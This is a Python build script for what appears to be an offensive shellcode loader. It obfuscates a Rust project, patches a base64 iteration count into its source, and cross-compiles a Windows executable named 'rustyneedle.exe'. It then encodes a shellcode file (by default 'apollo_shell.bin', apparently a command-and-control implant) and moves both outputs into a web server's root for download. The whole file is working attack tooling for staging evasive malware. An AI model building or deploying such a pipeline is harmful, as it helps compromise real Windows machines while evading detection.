import subprocess
import argparse
import re

def run_obfuscator():
    print("[*] Running obfuscator.py...")
    subprocess.run(["python3", "obfuscator.py"], check=True)


def replace_iterations_in_rust(iterations, rust_file='src/main.rs'):
    print(f"[*] Replacing iteration value with {iterations} in {rust_file}...")
    with open(rust_file, 'r', encoding='utf-8') as f:
        code = f.read()

    # Match a number literal that:
    # - Is not inside a string
    # - Is preceded by optional spaces and = sign
    # - Is followed by optional semicolon, comma, or newline
    updated_code = re.sub(
        r'(?<!["\w])(?<=\s=\s)(\d+)(?=[;\n,])',
        str(iterations),
        code,
        count=1
    )

    with open(rust_file, 'w', encoding='utf-8') as f:
        f.write(updated_code)

def build_rust_project():
    print("[*] Building Rust project...")
    subprocess.run(["cargo", "build", "--target", "x86_64-pc-windows-gnu", "--release"], check=True)

def run_encoder(shellcode_file, iterations):
    print(f"[*] Running encoder: python3 encode.py {shellcode_file} {iterations} rust.txt")
    subprocess.run(["python3", "encode.py", shellcode_file, str(iterations), "rust.txt"], check=True)

def main():
    parser = argparse.ArgumentParser(description="Driver for obfuscating, building, and encoding a Rust project.")
    parser.add_argument("iterations", type=int, help="The number of base64 iterations to embed in the Rust code.")
    parser.add_argument("shellcode_file", nargs="?", default="apollo_shell.bin", help="Shellcode binary file to encode.")
    args = parser.parse_args()

    run_obfuscator()
    replace_iterations_in_rust(args.iterations)
    build_rust_project()
    run_encoder(args.shellcode_file, args.iterations)

    print("[*] Moving final files to /var/www/html...")
    subprocess.run(["sudo", "mv", "target/x86_64-pc-windows-gnu/release/rustyneedle.exe", "/var/www/html"], check=True)
    subprocess.run(["sudo", "mv", "rust.txt", "/var/www/html"], check=True)

if __name__ == "__main__":
    main()

